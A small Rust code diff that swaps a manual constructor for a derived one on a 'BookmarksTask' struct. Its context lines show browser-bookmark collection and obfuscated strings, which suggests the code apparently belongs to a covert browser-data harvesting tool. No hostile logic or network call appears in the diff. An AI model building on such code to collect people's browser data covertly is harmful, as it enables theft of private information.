@@ -5,6 +5,7 @@ use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
 use collector::{Browser, Collector};
+use derive_new::new;
 use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
@@ -12,14 +13,9 @@ use json::{Value, parse};
 use obfstr::obfstr as s;
 use tasks::{Task, parent_name};
 
+#[derive(new)]
 pub(super) struct BookmarksTask {
     browser: Arc<BrowserData>,
-}
-
-impl BookmarksTask {
-    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for BookmarksTask {
